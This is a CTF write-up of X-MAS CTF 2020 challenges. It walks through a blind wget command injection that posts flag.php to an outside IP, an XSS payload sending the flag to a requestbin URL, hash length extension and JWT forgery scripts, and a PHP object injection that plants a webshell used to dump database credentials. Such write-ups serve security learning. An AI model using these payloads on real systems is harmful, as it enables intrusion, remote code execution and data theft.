---
layout: post
date: 2020-12-19 00:00:00
title: "X-MAS CTF 2020 Write Up"
categories: CTF
tags: [Blind Command Injection, Hash Length Extension Attack, XSS, PHP Object Injection, Type juggling]
author:
  - Jeongwon Jo
---

This is the first X-MAS CTF to start studying web security and it was much more fun than I thought. Let's write a Write Up of interesting problems while solving problems in this CTF.<br><br>

This time, I participated in CTF by collaborating with <span style="color:blue">`Einstrasse`</span>. If you want to see eine's Write Up, you can go [here](https://eine.tistory.com/entry/Xmas-CTF-2020-write-ups-focus-on-web-challs?category=826774)!

![](https://github.com/wjddnjs33/image2/blob/main/main.png?raw=true)

---

### (Programming) Least Greatest 
<strong>Challenge Author :</strong> Gabies, Nutu<br>
<strong>Category :</strong> Programming<br>
<strong>Points :</strong> 50<br>
<strong>Solves :</strong> 162<br>

![](https://github.com/wjddnjs33/image/blob/main/스크린샷%202020-12-18%20오전%206.13.28.png?raw=true)
This time, we will solve the programming problems from X-MAS CTF 2020. The problem was solved easily because `eine` analyzed the algorithm.
![](https://github.com/wjddnjs33/image/blob/main/스크린샷%202020-12-18%20오전%206.15.26.png?raw=true)
If you connect with nc, you can see that gcd, lcm numbers are given. Here, the number of factors obtained by decomposing the lcm/gcd value by 2^N is given to the next step.<br><br>

It is said that you can do this a total of 100 times, but the time should be within 90 seconds. So I just used Python to write the code and return it.
```python
from pwn import *
from subprocess import check_output
from time import sleep

r = remote("challs.xmas.htsp.ro", 6050)
r.recvuntil("1/100\n").strip().split()
def go(_count):
    for a in range(_count):
        num = r.recvline().decode('utf-8').split("= ")[1]
        num1 = r.recvline().decode('utf-8').split("= ")[1]
        print("gcd(x, y) : " + num)
        print("lcm(x, y) : " + num1)
        s_num = int(int(num1)//int(num))
        cmd = "yafu-x64 factor({})".format(s_num)
        out = subprocess.check_output(cmd, shell=True)
        check = out.decode('utf-8')
        length = check.count('P')
        data = []
        for i in range(1, length + 1):
            data.append('')
        j = 0
        for i in range(1, length+1):
            data[j] = check.split('P')[i].split(" =")[1].replace('\n', '').replace('\r', '').replace('ans', '')
            j += 1
        b = []
        k = 0
        for i in range(len(data)):
            if i == 0:
                b.append(data[i])
            if i != 0:
                for j in range(0+k,len(b)):
                    if b[j] != data[i]:
                        b.append(data[i])
                        k += 1           
        Count = len(b)
        count = 2**Count
        print("Round : {}".format(a+1))
        r.sendline(str(count))
        print(r.recvline())
        r.recvline()


if __name__ == '__main__':
    go(100)
    print(r.recv())
```
I wrote the exploit code as above.
![](https://github.com/wjddnjs33/image/blob/main/KakaoTalk_Photo_2020-12-18-06-22-00.png?raw=true)
When I returned the exploit code, I could see the flag appear.

`FLAG : X-MAS{gr347es7_c0mm0n_d1v1s0r_4nd_l345t_c0mmon_mult1pl3_4r3_1n73rc0nn3ct3d}`

---
### (Web) PHP Master `easy`
<strong>Challenge Author :</strong> yakuhito<br>
<strong>Category :</strong> WEB<br>
<strong>Points :</strong> 33<br>
<strong>Solves :</strong> 325<br>

![](https://github.com/wjddnjs33/image/blob/main/스크린샷%202020-12-18%20오전%206.25.00.png?raw=true)

Solve URL : `http://challs.xmas.htsp.ro:3000/?param1=1.0&param2=001`<br>
`FLAG : X-MAS{s0_php_m4ny_skillz-69acb43810ed4c42}`

---
### (Web) Santa's consolation `easy`
<strong>Challenge Author :</strong> littlewho<br>
<strong>Category :</strong> WEB<br>
<strong>Points :</strong> 50<br>
<strong>Solves :</strong> 285<br>

![](https://github.com/wjddnjs33/image/blob/main/스크린샷%202020-12-18%20오전%206.25.11.png?raw=true)

---
### (Web) flag_checker 
<strong>Challenge Author :</strong> yakuhito<br>
<strong>Category :</strong> WEB<br>
<strong>Points :</strong> 59<br>
<strong>Solves :</strong> 99<br>
<strong>TL;DR</strong> : Blind Command Injection<br>

![](https://github.com/wjddnjs33/image/blob/main/스크린샷%202020-12-18%20오전%206.25.20.png?raw=true)
This time, we will solve a problem called `flag_checker` among web problems in X-MAS CTF 2020.
```php
<?php
/* flag_checker */
include('flag.php');

if(!isset($_GET['flag'])) {
    highlight_file(__FILE__);
    die();
}

function checkFlag($flag) {
    $example_flag = strtolower('FAKE-X-MAS{d1s_i\$_a_SaMpL3_Fl4g_n0t_Th3_c0Rr3c7_one_karen_l1k3s_HuMu5.0123456789}');
    $valid = true;
    for($i = 0; $i < strlen($flag) && $valid; $i++)
        if(strpos($example_flag, strtolower($flag[$i])) === false) $valid = false;
    return $valid;
}


function getFlag($flag) {
    $command = "wget -q -O - https://kuhi.to/flag/" . $flag;
    $cmd_output = array();
    exec($command, $cmd_output);
    if(count($cmd_output) == 0) {
        echo 'Nope';
    } else {
        echo 'Maybe';
    }
}

$flag  = $_GET['flag'];
if(!checkFlag($flag)) {
    die('That is not a correct flag!');
}

getFlag($flag);
?>
```
When it comes to problems, the above PHP source code exists.
```php
function checkFlag($flag) {
    $example_flag = strtolower('FAKE-X-MAS{d1s_i\$_a_SaMpL3_Fl4g_n0t_Th3_c0Rr3c7_one_karen_l1k3s_HuMu5.0123456789}');
    $valid = true;
    for($i = 0; $i < strlen($flag) && $valid; $i++)
        if(strpos($example_flag, strtolower($flag[$i])) === false) $valid = false;
    return $valid;
}
```
Looking at the checkFlag function, it puts a fake flag in a variable called example_flag, and checks whether the character in $flag is in example_flag.<br><br>

If any of the values of $flag are not included in example_flag, False is returned.
```php
function getFlag($flag) {
    $command = "wget -q -O - https://kuhi.to/flag/" . $flag;
    $cmd_output = array();
    exec($command, $cmd_output);
    if(count($cmd_output) == 0) {
        echo 'Nope';
    } else {
        echo 'Maybe';
    }
}
```
The getFlag function receives the $flag value, connects it after the wget command, and sets the output of the exec function as an array.<br><br>

Here, if the command executed well, it prints Maybe, and if not, prints Nope.
```php
$flag  = $_GET['flag'];
if(!checkFlag($flag)) {
    die('That is not a correct flag!');
}

getFlag($flag);
```
In the above part, you can see that the flag value is received, the input value is verified using the checkFlag function, and the getFlag function is executed if the filtering does not occur.<br><br>

In this problem, the command execution value is not output, so the input value must be retrieved to a private server.<br><br>

So, first, let's check if there is a way to get the php file using the wget command.
![](https://github.com/wjddnjs33/image2/blob/main/스크린샷%202020-12-18%20오전%206.48.39.png?raw=true)
When I searched Google for Blind Command Injection, I could see that using the --post-file option of the wget command as above, the file was read and sent as the POST body value.
```javascript
const express = require('express');
const bodyParser = require('body-parser');
const PORT = 80;
const app = express();

app.use(bodyParser.urlencoded({
  extended: true
}));

app.post('/', function(req, res){
	console.log("X-MAS!!!!");
	console.log(req.body);
	res.send();
});

app.listen(PORT, function(){
	console.log('--------------------------------');
	console.log('Listening on port ' + PORT + '...');
	console.log('--------------------------------');
});
```
In order to receive the flag, I built a simple server using Node.js to output the POST body value as above.

`Payload : ${IFS}-${IFS}--post-file${IFS}flag.php${IFS}141.164.55.161`

So, I passed the payload above as the flag value.
![](https://github.com/wjddnjs33/image2/blob/main/스크린샷%202020-12-18%20오전%207.00.30.png?raw=true)
When I checked the server log, I could see the flag.php file came.

`FLAG : X-MAS{s0_fL4g_M4ny_IFS_bb69cd55f5f6}`

---
### (Web) X-MAS Chan
<strong>Challenge Author :</strong> yakuhito, Milkdrop<br>
<strong>Category :</strong> WEB<br>
<strong>Points :</strong> 470<br>
<strong>Solves :</strong> 26<br>
<strong>TL;DR</strong> : JWT Modified<br>


![](https://github.com/wjddnjs33/image/blob/main/스크린샷%202020-12-18%20오전%206.25.32.png?raw=true)
This time, we will solve the problem called `X-MAS Chan` among web problems from X-MAS CTF 2020.
![](https://github.com/wjddnjs33/image2/blob/main/스크린샷%202020-12-18%20오후%209.41.21.png?raw=true)
If you come into trouble, you can see there are links and rules that can get you into the board.
![](https://github.com/wjddnjs33/image2/blob/main/스크린샷%202020-12-18%20오후%209.43.59.png?raw=true)
When I came to the board, I can see that the file upload function exists as above.<br><br>

And as a result of checking, it was found that only photos such as jpg, png, and gif can be uploaded.
![](https://github.com/wjddnjs33/image2/blob/main/스크린샷%202020-12-18%20오후%209.51.25.png?raw=true)
Also, if you check the source code, you can see that there is getbanner.php, and the logic is logic to get a picture using jwt. `You can see that jwt is set as a value in a cookie called banner.`
![](https://github.com/wjddnjs33/image2/blob/main/스크린샷%202020-12-18%20오후%209.55.11.png?raw=true)
```
{
  "typ": "JWT",
  "alg": "HS256",
  "kid": "/tmp/jwt.key"
}
```
When the jwt is decoded, you can see that the header part uses the `HS256` algorithm as above and the kid value is using `/tmp/jwt.key`.
```
{
  "banner": "banner/11.gif"
}
```
As the data above, you can see that you are receiving a 11.gif photo as the value of the banner. So, if you give `flag.php` as the `value of banner`, it will read and return `flag.php`, not the picture.<br><br>

So how do I `sign` JWT when I don't know the `secret key`?<br><br>

You can think of the kid value in the header as a pointer to the secret key. In the above jwt, since kid points to `/tmp/jwt.key`, the value contained in jwt.key can be used as the secret key.<br><br>

So, upload a photo using the file upload function, and when the kid points to the photo, you can sign using the binary value of the photo.<br><br>
![](https://github.com/wjddnjs33/image2/blob/main/스크린샷%202020-12-18%20오후%2010.04.11.png?raw=true)
I will make a gif file as above and use it.
![](https://github.com/wjddnjs33/image2/blob/main/스크린샷%202020-12-18%20오후%2010.06.13.png?raw=true)
So, when I uploaded the file, you can see the file was created with the path `/b/src/1608071199792.gif`. Now, if you give the above path as the `kid` value in the jwt header, you can use the `binary value of the above file` as the `secret key.`
```python
import jwt

with open('jwt.gif', 'rb') as fp:
    key = fp.read()

print(jwt.encode({'banner': 'flag.php'}, key, algorithm='HS256', headers={'kid': '/var/www/html/b/src/1608071199792.gif'}))
```
I wrote jwt Signing code as above.
![](https://github.com/wjddnjs33/image2/blob/main/스크린샷%202020-12-18%20오후%2010.10.23.png?raw=true)
If you run the code, you can see jwt appear as above.
![](https://github.com/wjddnjs33/image2/blob/main/스크린샷%202020-12-18%20오후%2010.12.08.png?raw=true)
When I decode jwt and check it, I can see that the value is well entered.
![](https://github.com/wjddnjs33/image2/blob/main/스크린샷%202020-12-18%20오후%2010.16.02.png?raw=true)
So when I send a request to getbanner.php using the above jwt, you can see that flag.php is displayed, not the picture.

`FLAG : X-MAS{n3v3r_trust_y0ur_us3rs_k1ds-b72dcf5a49498400}`

---
### (Web) World's most complex SQL Query 
<strong>Challenge Author :</strong> Milkdrop<br>
<strong>Category :</strong> WEB<br>
<strong>Points :</strong> 484<br>
<strong>Solves :</strong> 19<br>
<strong>TL;DR</strong> : SQL Query Analysis<br>


![](https://github.com/wjddnjs33/image/blob/main/스크린샷%202020-12-18%20오전%206.32.05.png?raw=true)

---
### (Web) cat_clicker
<strong>Challenge Author :</strong> yakuhito<br>
<strong>Category :</strong> WEB<br>
<strong>Points :</strong> 474<br>
<strong>Solves :</strong> 24<br>
<strong>TL;DR</strong> : hash length extension attack<br>


![](https://github.com/wjddnjs33/image/blob/main/스크린샷%202020-12-18%20오전%206.25.59.png?raw=true)
This time, we will solve the problem called `Cat Clicker` among web problems from X-MAS CTF 2020.
![](https://github.com/wjddnjs33/image2/blob/main/스크린샷%202020-12-18%20오후%2010.43.58.png?raw=true)
When it comes to problems, there is logic to buy flags using the number of cats. The fake flag seems to be available for purchase if you have one cat and the real flag is 13 cats.
![](https://github.com/wjddnjs33/image2/blob/main/스크린샷%202020-12-18%20오후%2010.47.06.png?raw=true)
You can increase the number of cats by clicking on the face, but it seems like 12 is the maximum.
```
state : 12 | 0
hash : cf13ab76afb625f7f7d6c539c2cb3c84

state : 12 | 1
hash : e71f77e8f7c2c2957292f4a0e1d79d9d

(Skip)

state : 12 | 12
hash : 9579729592f72a075bb61f63b8ea238e
```
As above, the number of cats is managed by the hash value, and looking at the hash, it seems to be an md5 hash. 
![](https://github.com/wjddnjs33/image2/blob/main/스크린샷%202020-12-19%20오전%204.42.16.png?raw=true)
And since this web service has a .git directory, you can pull out all the .git trees.
![](https://github.com/wjddnjs33/image2/blob/main/스크린샷%202020-12-19%20오전%204.46.13.png?raw=true)
I downloaded all the .git trees using gitdumper.sh, and you can lick the source code using the `git cat-file -p` command.
```php
<?php

function hashFor($state) {
	$secret = getenv("SECRET_THINGY"); // 64 random characters - impossible to guess
	$s = "$secret | $state";
	return md5($s);
}


function verifyState($state, $hash) {
	return $hash === hashFor($state);
}


function getCatsNo($state) {
	$arr = explode(" | ", $state);
	return intval(end($arr));
}


function getParentsLimit($state) {
	$arr = explode(" | ", $state);
	return intval(reset($arr));
}

?>
```
The above code is the source code of helper.php. If you look at the hashFor function, you are using `salt`. As such, the hash value cannot be predicted, but you can bypass it using a `hash length extension attack`.<br><br>

Kindly the length of the salt is `64`, as you can see it shows in the tin. If you don't know the length of the salt, you need to estimate the length using `brute force`.
```php
function getCatsNo($state) {
	$arr = explode(" | ", $state);
	return intval(end($arr));
}
```
And if you look at the getCatsNo function, you can see that the last value of the array is used as the number of cats by using the end function.<br><br>

Therefore, when it becomes "`12 | 1 | Null Byte | 1000 |`", `1000` is used as the number of cats. If there is no logic to fetch only the last value of the array, it won't work.
![](https://github.com/wjddnjs33/image2/blob/main/스크린샷%202020-12-19%20오전%205.10.35.png?raw=true)
So, since I know the salt length, I made a payload using `hashpump`. (`URL encoding`)
```javascript
const fetch = require("node-fetch");
fetch('http://challs.xmas.htsp.ro:3003/api/buy.php', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: 'item_id=2&state=12%20%7C%201%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00H%02%00%00%00%00%00%00%20%7C%201000&hash=f48ccd5768b829f8856ae186eb4bf4a4'
}).then((x) => x.text()).then((x) => console.log(x));
```
As above, I wrote the exploit code using JavaScript.
![](https://github.com/wjddnjs33/image2/blob/main/스크린샷%202020-12-19%20오전%205.17.01.png?raw=true)
Finally, return the exploit code to see the successful purchase of the flag.

`FLAG : X-MAS{1_h4v3_s0_m4ny_c4t5_th4t_my_h0m3_c4n_b3_c0ns1d3r3d_4_c4t_sh3lt3r_aaf30fcb4319effa}`

---
### (Web) Comfort Bot
<strong>Challenge Author :</strong> Milkdrop<br>
<strong>Category :</strong> WEB<br>
<strong>Points :</strong> 432<br>
<strong>Solves :</strong> 39<br>
<strong>TL;DR</strong> : Simple XSS<br>


![](https://github.com/wjddnjs33/image2/blob/main/스크린샷%202020-12-19%20오전%205.31.43.png?raw=true)
This time, we will solve one of the web problems from X-MAS CTF 2020 called Comfort Bot.<br><br>

The peculiarity of the Comfort Bot problem was that it did not have a web server and was solved using the X-MAS bot within Discord. And it provides the source code, so let's check the source code first.
```python
# bot.py

elif (message.content.startswith ("!")):
	spell = True
	response = await engine.getCleverResponse (authorID, message.content[1:])
```
The code above is the part that is executed when the value input from the X-MAS Discord Bot starts with an exclamation mark.
```python
# engine.py

async def getCleverResponse (authorID, message):
	if (authorID == 0):
		return random.choice(["Oh, I quite certainly agree.", "There, there, it's alright.", "Oh!", "Fascinating!", "Exquisite reply!", "Running program: COMFORT.", "Understandable.", "Hmm.", "I see.", "Well, if you really think that...", "What are you doing?", "What are you up to?", "What's that?", "[Nodding]", "[Nodding and stroking chin saying mhmm]"])
	else:
		return await parseUsers (cleverDriver.getCleverResponse (authorID, message))
```
The code above is the getCleverResponse function in engile.py. In the code, you can see that if authorID is `0`, a random string in the array is printed, and if authorID is `not 0`, cleverDriver.getCleverResponse function is executed.
```python
# driver.py

async def getCleverResponse (authorID, txt):
	global driver

	try:
		driver.execute_script("window.open('http://localhost/','_blank');")
		windows[authorID] = driver.window_handles[-1]
		switchToAuthorWindow(authorID)
		
		script = "cleverbot.sendAI('{0}')".format (txt)
		driver.execute_script (script)
		while (driver.execute_script ("return cleverbot.aistate") != 0):
			await asyncio.sleep (0.4)
			switchToAuthorWindow(authorID)

		reply = driver.execute_script ("return cleverbot.reply")
		switchToAuthorWindow(authorID)
		driver.execute_script("window.close()")
		driver.switch_to_window(driver.window_handles[0])
		return reply
	except:
		CreateCleverDriver ()
```
The code above is in the getCleverResmpose function in driver.py!
```python
script = "cleverbot.sendAI('{0}')".format (txt)
driver.execute_script (script)
```
If you look in the middle, you can see the code above. The `txt` value is put in the script variable without any verification, and the script is executed using the `execute_script` function.<br><br>

You can trigger XSS in the logic right above.
```python
script = "cleverbot.sendAI('!asdf');fetch('/flag').then(x=>x.text()).then(x=>fetch("URL/?f=" + x));('')"
```
If you manipulate the code and make it as above, the fetch function runs well and you can steal the flag.
```
!asdf');fetch('/flag').then(x=>x.text()).then(x=>fetch("https://384bbb03a643480f7077ff3d9d4b01d5.m.pipedream.net/?f= " +x));('
```
So I wrote the payload as above and sent it to the X-MAS Discord Bot.
![](https://github.com/wjddnjs33/image2/blob/main/스크린샷%202020-12-19%20오전%206.28.33.png?raw=true)
Finally, when I checked the requestbin, I could see the flag came.

`FLAG : X-MAS{0h_J1nk135!!!Why_w0uld_y0u_br34k_our_commun4l_b07???125184ae}`

---
### (WEB) How Brutus stole Christmas
<strong>Challenge Author :</strong> Milkdrop<br>
<strong>Category :</strong> WEB<br>
<strong>Points :</strong> 492<br>
<strong>Solves :</strong> 13<br>
<strong>TL;DR</strong> : Simple PHP Object Injection, WebShell<br>


![](https://github.com/wjddnjs33/image2/blob/main/스크린샷%202020-12-19%20오전%206.41.24.png?raw=true)
This time, we will solve the problem of How Brutus stole Christmas among the web problems raised by the X-MAS CTF. This problem is a problem that I tried until the last time because I didn't have enough time to solve it.<br><br>

The peculiar thing about this problem is that one CTF site is given as a problem, and the problem is that the CTF site is hacked using the problem in the given CTF site.
```php
<?php

if (isset($_GET['source'])) {
    highlight_file(__FILE__);
    die();
}

class pageContent{
  private $file_name;
  private $newContent;

  function __construct() 
  { 
    $this->file_name="data/content.txt"; 
    $file = file_get_contents($this->file_name);
    $this->newContent=$file;
  } 

  function __toString(){
      return $this->newContent;
  }

  function setContent($newContent){
    $this->newContent=$newContent;
  }

  function __destruct() 
  { 
    $fd=fopen($this->file_name,"w");
    fwrite($fd,$this->newContent);
    fclose($fd);
  } 
}

function setFooter(){
  if(isset($_GET['newFooter'])){
    $newFooter=unserialize(base64_decode($_GET["newFooter"]));
    echo '<div class="footer" style="color: white">'.$newFooter.'</div>';
  }
  else{
    echo '<div class="footer" style="color: white">PWNgyan 2020!</div>';
  }
}

$page = new pageContent;
echo $page;
setFooter();
?>
```
I'm going to hack the site using problem 1 on the CTF site. If you come into question 1, you can find the code above.
```php
  function __destruct() 
  { 
    $fd=fopen($this->file_name,"w");
    fwrite($fd,$this->newContent);
    fclose($fd);
  } 
```
Looking at the code, you can see that when the destructor runs, it creates a file. After seeing this, I thought I should upload a web shell using PHP Object Injection.
```
O:11:"pageContent":2:{s:9:"file_name";s:10:"./abcd.php";s:10:"newContent";s:20:"<?php system("ls")?>";}
```
So, I just wrote a simple payload and sent it as above, but the file was not created well. So, mentality went out and did this and that, and suddenly `as3617` released PHP Object Injection PPT.<br><br>

Looking at this PPT, I learned that when a variable is defined as Private, Null Byte is attached to both sides of the variable.
```
O:11:"pageContent":2:{s:11:"file_name";s:10:"./abcd.php";s:12:"newContent";s:20:"<?php system("ls")?>";}
```
So, based on this, I wrote the payload again as above, but it didn't work well. So I couldn't solve the problem because of this.<br><br>

So, after the contest, I asked a person belonging to Defenit who was all over the web. It turns out that if the variable is defined as private, you need to reference the variable like \x00classname\x00variable.
```
O:11:"pageContent":2:{s:22:"�pageContent�file_name";s:15:"data/pyburp.php";s:23:"�pageContent�newContent";s:15:"<?=`$_GET[x]`?>";}
```
So, finally, I wrote the payload as above.
![](https://github.com/wjddnjs33/image2/blob/main/스크린샷%202020-12-19%20오전%207.29.00.png?raw=true)
When I uploaded the webshell and accessed the file, I was able to confirm that the webshell was uploaded well.
```
http://challs.xmas.htsp.ro:3050/data/pyburp.php?x=ls ~/
output => ctfx

http://challs.xmas.htsp.ro:3050/data/pyburp.php?x=ls ~/ctfx
output => composer.json composer.lock htdocs include install writable

http://challs.xmas.htsp.ro:3050/data/pyburp.php?x=ls ~/ctfx/include
output => Config.php cache.inc.php captcha.inc.php config config_loader.inc.php constants.inc.php db.inc.php email.inc.php files.inc.php general.inc.php json.inc.php language layout mellivora.inc.php raceconditions.inc.php session.inc.php thirdparty two_factor_auth.inc.php xsrf.inc.php

http://challs.xmas.htsp.ro:3050/data/pyburp.php?x=ls ~/ctfx/include/config
=> config.default.inc.php db.default.inc.php

http://challs.xmas.htsp.ro:3050/data/pyburp.php?x=cat ~/ctfx/include/config/db.default.inc.php
output => 
<?php

/**
 *
 * This file contains default configuration.
 *
 *        DO NOT MAKE CHANGES HERE
 *
 * Copy this file and name it "db.inc.php"
 * before making any changes. Any changes in
 * db.inc.php will override the default
 * config. It is also possible to override
 * configuration options using environment
 * variables. Environment variables override
 * both the default settings and the hard-coded
 * user defined settings.
 *
 */

Config::set('MELLIVORA_CONFIG_DB_ENGINE', 'mysql');
Config::set('MELLIVORA_CONFIG_DB_HOST', 'localhost');
Config::set('MELLIVORA_CONFIG_DB_PORT', 3306);
Config::set('MELLIVORA_CONFIG_DB_NAME', 'mellivora');
Config::set('MELLIVORA_CONFIG_DB_USER', 'mellivora');
Config::set('MELLIVORA_CONFIG_DB_PASSWORD', 'rac9138cn98ascnascud');
```
When I checked using a web shell, I could see that the Database configuration file exists. Then, let's connect to the DB using the mysql command.
![](https://github.com/wjddnjs33/image2/blob/main/스크린샷%202020-12-19%20오전%207.40.25.png?raw=true)
[+] If you know the database name, user name, and password, you can run the query as above using the -e option of the mysql command and see the result immediately.
```
http://challs.xmas.htsp.ro:3050/data/pyburp.php?x=mysql -D mellivora -u mellivora -prac9138cn98ascnascud -e "show tables;"
output => Tables_in_mellivora categories challenges cookie_tokens countries exceptions files hints ip_log news reset_password submissions two_factor_auth user_types users

http://challs.xmas.htsp.ro:3050/data/pyburp.php?x=mysql -D mellivora -u mellivora -prac9138cn98ascnascud -e "select * from challenges"
output => 
id	added	added_by	title	category	description	exposed	available_from	available_until	flag	case_insensitive	automark	points	initial_points	minimum_points	solve_decay	solves	num_attempts_allowed	min_seconds_between_submissions	relies_on
1	1606078385	1	Brutus	1	Everyone hates Brutus! But does Brutus hate everyone? Who knows? Or rather, who cares?! What we care about here is the flag. Nothing more.
\n
\nLink: [url]http://challs.xmas.htsp.ro:3050[/url]	1	1584699200	1617235206	pwngyanctf{we_dont_remember_the_actual_flag_:(}	0	1	500	500	50	100	2	0	5	0
2	1606081056	1	Hard Challenge	1	Now it's time for a ramp-up in difficulty. You thought Brutus was hard? Ha! Check this one out then, punk.
\n
\nLink: [url]http://challs.xmas.htsp.ro:3051[/url]	1	1584699200	1617235206	X-MAS{Brutus_why_d1d_y0u_h4v3_t0_h4v3_RCE_113c41afe0}	0	1	500	500	50	100	0	0	5	0
3	1606081136	1	Hello World!	2	Welcome to PWNgyan CTF 2020!
\n
\n[b]pwngyanctf{H3ll0_H4ckerz_3141cc5f}[/b]	1	1584699200	1617235206	pwngyanctf{H3ll0_H4ckerz_3141cc5f}	0	1	10	10	10	1	3	0	5	0

```
When I ran through the database using the mysql command, there was a flag of the table called challenges.

`FLAG : X-MAS{Brutus_why_d1d_y0u_h4v3_t0_h4v3_RCE_113c41afe0}`

---
